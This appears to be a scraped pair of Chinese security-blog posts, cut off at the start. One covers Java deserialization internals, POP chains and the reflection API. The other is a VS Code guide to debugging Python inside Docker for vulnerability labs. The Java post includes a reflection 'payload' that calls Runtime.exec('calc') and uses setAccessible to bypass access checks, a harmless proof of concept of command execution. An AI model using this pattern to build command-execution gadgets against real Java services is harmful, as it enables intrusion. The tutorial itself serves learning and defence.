26 27 28 29 30 31 32 33 34 35 private String readUTFBody(long utflen) throws IOException { StringBuilder sbuf; if (utflen \u0026gt; 0 \u0026amp;\u0026amp; utflen \u0026lt; Integer.MAX_VALUE) { // a reasonable initial capacity based on the UTF length int initialCapacity = Math.min((int)utflen, 0xFFFF); sbuf = new StringBuilder(initialCapacity); } else { sbuf = new StringBuilder(); } if (!blkmode) { end = pos = 0; } while (utflen \u0026gt; 0) { int avail = end - pos; if (avail \u0026gt;= 3 || (long) avail == utflen) { utflen -= readUTFSpan(sbuf, utflen); } else { if (blkmode) { // near block boundary, read one byte at a time utflen -= readUTFChar(sbuf, utflen); } else { // shift and refill buffer manually if (avail \u0026gt; 0) { System.arraycopy(buf, pos, buf, 0, avail); } pos = 0; end = (int) Math.min(MAX_BLOCK_SIZE, utflen); in.readFully(buf, avail, end - avail); } } } return sbuf.toString(); } 粗略理解一下：\nreadUTFBody，它的作用是从输入流中读取指定长度的UTF-8字符串，并将其转换为Java的String类型返回。\n具体来说，代码的主要逻辑如下：\n根据指定的 utflen（表示UTF-8编码的字节数）创建一个 StringBuilder 对象 sbuf，作为存储解码后字符串的缓冲区。如果 utflen 在 0 和 Integer.MAX_VALUE 之间，则设置 sbuf 的初始容量为 utflen 和 0xFFFF 之间的较小值，以提高性能。\n如果当前输入流不处于块模式，则将输入流的 pos 和 end 分别设置为0，表示当前没有读取任何数据。\n进入一个while循环，循环条件是utflen大于0，即还需要继续读取字符串。\n在每次循环中，根据输入流的 pos 和 end 计算当前可用的字节数 avail。如果 avail 大于等于3，或者与 utflen 相等，则调用 readUTFSpan() 方法读取一段连续的字节，并将其解码成字符串，将解码后的字符串追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。\n如果avail小于3且不等于 utflen ，则分两种情况处理：\n如果当前输入流处于块模式，则说明接近块边界，便逐个字节地读取剩余字节，调用readUTFChar函数读取一个字符，将解码后的字符追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。 如果当前输入流不处于块模式，则手动移动剩余字节到缓冲区的开头，重新填充缓冲区，将 pos 和 end 分别设置为0和新的可读取字节数，然后继续循环读取数据。 在while循环结束后，返回 sbuf 缓冲区中存储的解码后的字符串，即读取的UTF-8字符串。\n需要注意的是，在读取字节和解码字符串的过程中，如果遇到任何错误（如读取字节失败、解码失败等），则会抛出 IOException 或UTFDataFormatException 异常。\n简单来说就是把字节流转换成字符串的函数，字节流是从buff变量里面读取的，buff是什么时候赋值的呢 in.readFully()\n所以完整序列化数据到对象的过程：\nin.readFully()读入指定位置和字数的字节到buff，readUTFBody()和readUTFSpan()控制buff字节流的同时读出里面的属性名与其对应属性，返回到ObjectStreamClass里组装到fields里，然后返回值一路返回到ObjectInputStream类里，这之前都是为了生成对类的细节描述“des”：类名，属性名，属性类型，做好了对象的框架后最后再ObjectStreamClass里对类进行了实例化\n调用的也是反射类的实例函数：\n最后在ObjectInputStream里obj接收到了返回的实例化好的空的UnsafeClass0对象\n此时再次调试发现回到了我们定义的类里面\n所以可以确定了，在执行UnsafeClass0.readObject中的in.defaultReadObject();之前，都只是在初始化一个UnsafeClass0类的实例化对象，此时再进入defaultReadObject进行值的赋\ndefultReadObject做的是就是拿到当前需要赋值的ObjcurObj和当前处理好的对该Obj的描述curDesc然后在创建FieldValuse对象初始化\n这次初始化也是通过调用\nreadUTF等一系列方法对序列化字节进行处理得到具体值\n通过curDesc拿到该赋的具体值给curObj赋值，即可完成反序列化\n第二个问题 UnsafeClass0 的 readObject 是有参数的，所以UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject();肯定不是直接调用 UnsafeClass0 中的 readObject，那是谁调用的呢？可以通过函数栈观察\n调用情况使用 =\u0026gt; 表示\nmain =\u0026gt; ObjectInputStream.readObject =\u0026gt; ObjectInputStream.readObject0 =\u0026gt; ObjectInputStream.readOrdinaryObject =\u0026gt; ObjectInputStream.readSerialData =\u0026gt; ObjectStreamClass.invokeReadObject =\u0026gt; Method.invoke =\u0026gt; 然后一堆看不懂的 =\u0026gt; UnsafeClass0.readObject\n看到熟悉的 Method.invoke了吗，（好吧其实也不是很熟）Java也是通过反射来调用 UnsafeClass0.readObject\n至此，反序列化的初步理解就告一段落了\nPOP链 ​\tPOP（Property-Oriented Programming）直译的话就是面向属性编程，如果学过二进制的话就可以类比一下ROP。 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。\n​\t作者个人理解：从可控的输入点到最终的代码执行点一般不是直达的，此时需要精心构造或者寻找一些能够在不同对象，方法之间跳转的跳板函数或者跳板对象。且这些跳板本身可能并不是用作跳板用途，有时候的跳板可能只是利用了相关函数的设计机制（例如PHP中访问一个对象不存在的方法时会被调用该对象的__class__魔术方法）\n​\t在之后的文章中，会深刻的领悟到POP的精髓\n反射 要知道什么是反射，首先就要知道\u0026quot;正射\u0026quot;是怎么样的\n一般情况下，我们使用某个类前，我们是知道这个类的类名的，比如实例化对象的时候\n1 2 Apple apple = new Apple(); //直接初始化，「正射」 apple.setPrice(4); 类似这种知道要初始化类的类名，并将其写死在代码中，运行时无法更改的，就可以称之为正射\n反射的话就是和正射反着来，程序运行起来之前，我并不知道我需要初始化类的类名叫什么，所以我无法在代码中写死\n举一个不恰当但是很合适的需求：我需要使用Java写一个程序，在其运行期间，我每输入一个类的名字，Java程序就帮我实例化好这个类对象，将其序列化成字节流，并创建写入一个文件，路径和我的工作路径相同，文件名就是我输入的类的名字，其中对象的整形属性按照变量名的字母数赋值，其他类型的属性赋值为 Null\n如果没有在其运行期间这个前提条件的话，实现这个需求我们可以手动 new 出对象来，然后数出变量名字母数，然后序列化好放入文件中\n​\t反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。\n但是在运行期间的话，只能使用到反射了（举例到此为止，接下来的代码不解决上诉需求）\n我们可以使用 JDK 提供的反射 API 进行反射调用\n1 2 3 4 5 Class clz = Class.forName(\u0026#34;com.dan.Apple\u0026#34;); Method method = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); Constructor constructor = clz.getConstructor(); Object object = constructor.newInstance(); method.invoke(object, 4); 这两段代码的能实现相同的作用，但是第二段代码获取类实例化对象时，类名是通过字符串获取的\n反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。\n接下来先看看使用反射我们能简单干些什么，怎么使用反射\n获取Class对象 在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。\n有三种方法\n第一种，使用 Class.forName 静态方法。当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。\nClass clz = Class.forName(\u0026quot;java.lang.String\u0026quot;);\n第二种，使用 .class 方法。\n这种方法只适合在编译前就知道操作的 Class 名\nClass clz = String.class;\n第三种，使用类对象的 getClass() 方法\nString str = new String(\u0026quot;Hello\u0026quot;); Class clz = str.getClass();\n这三种获取CLass类方式中，我们一般使用第一种通过Class.forName方法去动态加载类。且使用 forName 就不需要import导入其他类，可以加载我们任意的类。 使用第二种类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 使用第三种实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用第一种Class.forName方法去获取。\n获取成员变量Field 获取成员变量Field位于java.lang.reflect.Field包中\nField[] getFields() ：获取所有public修饰的成员变量\nField[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符\nField getField(String name) 获取指定名称的 public修饰的成员变量\nField getDeclaredField(String name) 获取指定的成员变量\n用一个例子理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import java.lang.reflect.Field; public class FieldTest { public String name; public String profession; protected int age; private String number; char sex; public static void main(String[] args){ try{ Class c1 = Class.forName(\u0026#34;com.dan.FieldTest\u0026#34;); // 创建Class对象 Field[] fieldArray1 = c1.getDeclaredFields(); //获取全部成员变量 Field[] fieldArray2 = c1.getFields();// 获取全部public成员变量 for (Field field : fieldArray1){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Field field : fieldArray2){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray3 = c1.getField(\u0026#34;name\u0026#34;); // 获取指定名称的public修饰的成员变量 System.out.println(fieldArray3.getName()); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray4 = c1.getDeclaredField(\u0026#34;number\u0026#34;); // 获取指定的成员变量 System.out.println(fieldArray4.getName()); } catch (Exception e) { e.printStackTrace(); } } } 获取成员方法Method Method getMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的public方法\nMethod getDeclaredMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的所有方法\n//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型\nMethod[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法\nMethod[] getDeclaredMethods() // 获取该类中的所有方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import java.lang.reflect.Method; public class MethodTest { public void study(String s) { System.out.println(\u0026#34;学习中...\u0026#34; + s); } protected void run() { System.out.println(\u0026#34;跑步中...\u0026#34;); } void eat() { System.out.println(\u0026#34;吃饭中...\u0026#34;); } private String sleep(int age) { System.out.println(\u0026#34;睡眠中...\u0026#34; + age); return \u0026#34;sleep\u0026#34;; } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.MethodTest\u0026#34;); // 创建Class对象 Method[] methods1 = c.getDeclaredMethods(); // 获取所有该类中的所有方法 Method[] methods2 = c.getMethods(); // 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法 for (Method m:methods1) { System.out.println(m.); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Method m:methods2) { System.out.println(m); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method methods3 = c.getMethod(\u0026#34;study\u0026#34;, String.class); // 获取study方法 System.out.println(methods3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method method4 = c.getDeclaredMethod(\u0026#34;sleep\u0026#34;, int.class); // 获取sleep方法 System.out.println(method4); } catch (Exception e) { e.printStackTrace(); } } } 运行结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //public static void com.dan.MethodTest.main(java.lang.String[]) //protected void com.dan.MethodTest.run() //private java.lang.String com.dan.MethodTest.sleep(int) //public void com.dan.MethodTest.study(java.lang.String) //void com.dan.MethodTest.eat() //-------分割线--------- //public static void com.dan.MethodTest.main(java.lang.String[]) //public void com.dan.MethodTest.study(java.lang.String) //public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException //public final void java.lang.Object.wait() throws java.lang.InterruptedException //public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException //public boolean java.lang.Object.equals(java.lang.Object) //public java.lang.String java.lang.Object.toString() //public native int java.lang.Object.hashCode() //public final native java.lang.Class java.lang.Object.getClass() //public final native void java.lang.Object.notify() //public final native void java.lang.Object.notifyAll() //-------分割线--------- //public void com.dan.MethodTest.study(java.lang.String) //-------分割线--------- //private java.lang.String com.dan.MethodTest.sleep(int) // //Process finished with exit code 0 获取构造函数 Constructor\u003c?\u003e[] getConstructors() ：只返回public构造函数\nConstructor\u003c?\u003e[] getDeclaredConstructors() ：返回所有构造函数\nConstructor\u0026lt;\u0026gt; getConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) : 匹配和参数配型相符的public构造函数\nConstructor\u0026lt;\u0026gt; getDeclaredConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) ： 匹配和参数配型相符的构造函数\n例子总比文字好理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import java.lang.reflect.Constructor; public class ConstructorTest { public ConstructorTest() { System.out.println(\u0026#34;无参构造函数\u0026#34;); } public ConstructorTest(String name) { System.out.println(\u0026#34;有参构造函数\u0026#34; + name); } private ConstructorTest(boolean n) { System.out.println(\u0026#34;私有构造函数\u0026#34;); } public static void main(String[] args) { try { Class c1 = Class.forName(\u0026#34;com.dan.ConstructorTest\u0026#34;); Constructor[] constructors1 = c1.getDeclaredConstructors(); Constructor[] constructors2 = c1.getConstructors(); for (Constructor c : constructors1) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Constructor c : constructors2) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors3 = c1.getConstructor(String.class); System.out.println(constructors3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors4 = c1.getDeclaredConstructor(boolean.class); System.out.println(constructors4); } catch (Exception e) { e.printStackTrace(); } } } 获取对象 先获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n根据 Class 对象实例获取 Constructor 函数 Constructor appleConstructor = clz.getConstructor();\n使用 Constructor 对象的 newInstance 方法获取反射类对象 Apple appleObj = (Apple)appleConstructor.newInstance();\n或者也可以使用 Class对象 的newInstance()方法来进行创建类对象\nApple appleObj = (Apple)clz.newInstance();\n区别在于通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码是使用一个有参数的构造方法进行了类对象的初始化\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\u0026#34;红富士\u0026#34;, 15); 常用的是如下实例：\n1 2 Class clz = Class.forName(\u0026#34;com.api.Apple\u0026#34;); // 创建Class对象 Apple appleObj = (Apple) clz.newInstance(); // 创建类对象 调用方法步骤 获取对象使用的是 newInstance()，那么调用函数使用的就是invoke()\ninvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法。一般会和getMethod方法配合进行调用。\ninvoke使用小Tips：\npublic Object invoke(Object obj, Object... args)\nobj：从中调用底层方法的对象，必须是实例化对象 如果调用的这个方法是普通方法**，**第一个参数就是目标类实例化对象； 如果调用的这个方法是静态方法，第一个参数就是Class对象；\nargs： 用于方法的调用，是一个object的数组，参数有可能是多个\n基本步骤\n获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n获取方法的 Method 对象 Method setPriceMethod = clz.getMethod(\u0026quot;setPrice\u0026quot;, int.class);\n利用 Method 对象的 invoke 方法调用方法（本例子需要提前准备实例化对象） setPriceMethod.invoke(appleObj, 14);\n调用方法完整小例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.dan; import java.lang.reflect.Method; public class ReflectTest { public void reflectMethod() { System.out.println(\u0026#34;反射测试成功!!!\u0026#34;); } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.ReflectTest\u0026#34;); // 创建Class对象 Object m = c.newInstance(); // 创建类实例对象 Method method = c.getMethod(\u0026#34;reflectMethod\u0026#34;); // 获取reflectMethod方法 method.invoke(m); // 调用类实例对象方法 } catch (Exception e) { e.printStackTrace(); } } } ​\t上面讲述了反射机制流程概念和基本使用方法，从Class对象获取，到获取成员变量、成员方法和构造函数，接着是newInstance创建类对象和invoke方法，最后是一个简单反射例子的组成。\n回归到漏洞学习中，看看如何使用java反射中如何获取Runtime类来命令执行\n1 2 3 4 5 6 7 8 9 10 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Object b = a.newInstance(); Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); c.invoke(b,\u0026#34;calc\u0026#34;); } } 上面的例子会报错：\n但我们发现了使用newInstance产生了报错的话，而往往其可能是以下原因未能实现。\n1、使用的类没有无参构造函数 2、使用的类构造函数是私有的\n构造函数私有化 上例报错是因为构造函数私有，构造函数私有有如下作用：\n单例模式\n单例模式主要有3个特点：\n类的内部包括一个类的实例，并且为static类型\n构造函数为私有\n通过提供一个获取实例的方法，比如getInstance，该方法也为static类型。 调用的时候，我们可以通过某些特殊静态函数例如Singleton instance = Singleton.getInstance();来获得实例化的对象\n单例模式的使用： 很多时候，我们只需要一个对象就可以了，不希望用户来构造对象，比如线程池，驱动，显示器等。如果把构造函数私有，那么很多程序都可以得到其实例，将会带来混乱。\n防止实例化\n在Java的工具类中，有很多就是利用这种方法\n一个工具类Utils，里面含有很多静态函数或者静态变量，由于静态的原因，我们完全可以通过类名来访问，这样，我们就没有必要实例化它们，所以我们可以将其构造函数设置为私有，这样就防止用户滥用。\nRuntime也是一个工具类，所以构造函数有私有的必要\n那我们应该怎么构造呢？原本弹计算器应该是这样的：\nRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;);\n可以看到是通过getRuntime()方法获得的实例化对象\n那么我们可以先使用反射调用静态方法获得对象后再执行exec()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); // Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // Object b = a.newInstance(); // Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); // c.invoke(b,\u0026#34;calc\u0026#34;); Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method rundan = a.getMethod(\u0026#34;getRuntime\u0026#34;); Object b = rundan.invoke(a); Method run1 = a.getMethod(\u0026#34;exec\u0026#34;, String.class); run1.invoke(b,\u0026#34;calc\u0026#34;); } } 此例便可以弹出计算机了\n如果将这些代码简化一下，就可以得到\n1 2 Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(a.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(a),\u0026#34;calc\u0026#34;); 常见的反射payload\n如果就想使用newInstance()来获得构造呢，在之前获得对象中有提到\n使用 Constructor 对象的 newInstance 方法获取反射类对象\n所以可以先试试\n1 2 3 4 5 6 7 8 9 10 11 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); System.out.println(cs); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String[].class).invoke(o,\u0026#34;calc\u0026#34;); } } 但是依旧报错：\n佬说需要通过setAccessible(true)来突破访问权限的检查\n​\t在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。\n​\tJava.lang.reflect.AccessibleObject 类是Field，Method和Constructor类对象的基类，它提供了标记反射对象的能力，以抑制在使用时使用默认Java语言访问控制检查，从而能够任意调用被私有化保护的方法、域和构造函数，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。\nsetAccessible()是AccessibleObject类的public函数，该类被Executable继承，之后Executable又被Constructor继承\n所以可以使用Field，Method和Constructor类的实例化对象去访问该函数，代码改进为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); cs.setAccessible(true); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(o,\u0026#34;calc\u0026#34;); } } 还是报错，，，，\n猜测是Java版本过新，解决办法：\n如果没有类似我一样的方框的话，找到 Modify options ，去里面把\n这个勾选上就有了，方框里填--add-opens java.base/java.lang=ALL-UNNAMED\n最后运行，成功弹出计算器\n​\t在实际利用场景当中，我们通常利用Java反射机制来绕过一些安全权限机制检查，如获取private权限的方法和属性。本质就是我们绕过访问安全检查。所以通过java反射机制的学习，能够为我们为我们后面的java漏洞分析调试，java漏洞poc测试和服务端模板引擎注入等有着十分重要的意义。\n泛型 关于泛型的介绍可以参考链接（Java泛型详解，史上最全图文详解）\n相关补充 Field类粗略理解\n​\tJava中的Field类是反射机制的一部分，它的设计初衷是为了在运行时动态地获取和操作类的成员变量，包括私有变量。使用Field类可以获取类中的所有变量信息，包括变量名、类型、访问修饰符等，并可以通过它们进行读取、修改或设置新的值。 ​\tField类的设计使得开发者可以在运行时获取和操作类的成员变量，这在某些情况下是非常有用的，例如：\n当需要通过反射获取或设置某个类的私有变量时； 当需要动态地创建对象或者通过反射调用对象的方法时，需要访问对象中的成员变量； 当需要实现某些自定义的序列化或者反序列化机制时，需要获取或设置对象中的成员变量。 因此，Field类的设计初衷是为了提供一种方便的方式，使得开发者可以在运行时动态地获取和操作类的成员变量。\nSerialCallbackContext类理解\nctx 是一个 SerialCallbackContext 类对象， SerialCallbackContext类是内部类，无法在包（java.io）外引用，且该类为final，无法被继承，该类的描述：\n大意就是\n从对象流向上调用类定义的readObject/writeObject方法时的上下文。保存当前被反序列化的对象和当前类的描述符。这个上下文跟踪构造它的线程，并且只允许一个defaultReadObject, readFields, defaultWriteObject或writeFields的调用，这些必须在类的readObject/writeObject方法返回之前在同一个线程上调用。如果未设置为当前线程，getObj方法将抛出NotActiveException。\n有如下成员变量：\n被操作的Object，内含的对象流类，当前操作线程\n1 2 3 private final Object obj; private final ObjectStreamClass desc; private Thread thread; 参考链接 Java反序列化漏洞从入门到深入\nJAVA反序列化漏洞基础原理\nJava 中序列化与反序列化，看这篇就够了！\nJava 日看一类（53）之IO包中的SerialCallbackContext类\nJava I/O 25 - BlockDataInputStream\n大白话说Java反射：入门、使用、原理\nJAVA安全基础（二）\u0026ndash; 反射机制\nJava私有构造函数的使用\nJava泛型详解，史上最全图文详解\n","date":"0001-01-01T00:00:00Z","permalink":"https://d4n-sec.github.io/p/d4n%E7%9A%84java%E5%AE%89%E5%85%A8%E8%B7%AF/","title":"D4n的Java安全路"},{"content":"本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n为何 日益增多的框架和漏洞学习中，VulDB一键搭建成为安全研究福音。为更好地跟踪Payload利用路径，调试成为必不可少的一步，但VulDB以Docker为基石，随之而来只能选择非本地搭建而使用现有的Docker进行远程调试，本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n前提 有与本地互通的Docker环境\nVulDB源码已安装\n正常的逻辑思维，动手能力，观察能力以及信息搜集能力\n笔者环境 Windows10家庭版 WSL2 + Docker Desktop VScode\n记录 VScode正常安装，Docker 参照VulDB正常启动后，VScode本地安装 Remote Development 插件包（起作用的是Dev Containers，但作者未研究相关插件依赖关系，遂建议均安装） 查看右侧发现出现此图标点击发现有已启动的Docker环境\n右键Files上一栏（如图）后点击Attach Visual Dtudio Code 另起一个窗口\n后等待VScode安装Server端，等待启动便可\nDocker端（后述为远端）需安装插件如下（除红框外其他插件并非笔者主动安装）\n注：python新版本插件 Python 不支持3.7版本以下的python，需要指定安装旧版本，实测插件版本为2022.6.0版本支持 python 3.6 debug\npython版本确认 右下角查看Python环境发现出现不知一个\n利用各种方法确认当前Docker启动时使用哪个版本的Python 方案 0 ：进入Terminal，python 运行临时环境，import 项目扩展包（项目使用但非基础环境），如果导入失败即可排除该版本\n在准备好后，切换到项目需求的python版本后点击Debug模块，创建launch.json\n无启动特殊设置的话（启动脚本与主要编写脚本不一致，需要带参运行）使用默认即可，如需设置自行百度\n打上断点后尝试运行基本脚本测试\n能断代表设置成功\n问题以及解决 问题 在调试时发现框架函数无法如本地一样进入查看细节\n解决 在确认使用python版本号的前提下，使用该版本python全路径运行以下命令：\npython -c \u0026quot;import site;print(site.getusersitepackages())\u0026quot;\n确认项目扩展包位置，笔者如图\n在远端设置（setting.json）中（user或者WorkSpace均可）设置如下字段后，再次尝试Debug\n进入函数失败，右下角提示\nlaunch.json 中设置相关字段，如下图\n再次尝试，成功进入框架函数，但依旧无法主动点击进入，此时更换该插件版本，与Python插件对应，即可（笔者同样使用2022.6.0）\n","date":"0001-01-01T00:00:00Z","permalink":"https://d4n-sec.github.io/p/vscode-docker-python-debug%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","title":"VScode+Docker+Python+Debug安装指南"}]